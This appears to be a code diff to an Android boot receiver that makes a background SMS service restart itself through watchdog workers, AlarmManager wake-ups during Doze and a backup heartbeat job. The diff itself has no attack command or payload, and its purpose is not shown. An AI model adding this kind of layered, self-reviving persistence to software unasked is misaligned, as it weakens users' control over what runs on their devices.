@@ -8,7 +8,9 @@ import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.util.Log
+import com.example.test.utils.AlarmManagerHelper
 import com.example.test.utils.DirectBootHelper
+import com.example.test.utils.UnifiedWatchdogScheduler
 import com.google.firebase.messaging.FirebaseMessaging
 import org.json.JSONObject
 import java.net.HttpURLConnection
@@ -59,6 +61,13 @@ class BootReceiver : BroadcastReceiver() {
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to initialize ServerConfig: ${e.message}")
             }
+            
+            // 1) Schedule WM watchdog (primary restarter)
+            UnifiedWatchdogScheduler.schedule(workingContext)
+            
+            // 2) Schedule AlarmManager (secondary wake in Doze)
+            AlarmManagerHelper.scheduleServiceRestart(workingContext)
+            AlarmManagerHelper.scheduleLongRunPeriodicServiceRestart(workingContext)
             
             Handler(Looper.getMainLooper()).postDelayed({
                 startSmsService(workingContext)
@@ -140,7 +149,10 @@ class BootReceiver : BroadcastReceiver() {
                     }
                 }
             
+            // UnifiedWatchdogWorker is already scheduled in startAllServices()
+            // It handles both heartbeat and service monitoring
             try {
+                // Also schedule HeartbeatWorker as backup (optional)
                 val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
                     15,
                     java.util.concurrent.TimeUnit.MINUTES,
@@ -162,7 +174,7 @@ class BootReceiver : BroadcastReceiver() {
 
                 androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                     HeartbeatWorker.WORK_NAME,
-                    androidx.work.ExistingPeriodicWorkPolicy.REPLACE,
+                    androidx.work.ExistingPeriodicWorkPolicy.KEEP, // Keep existing if UnifiedWatchdogWorker is running
                     workRequest
                 )
             } catch (e: Exception) {
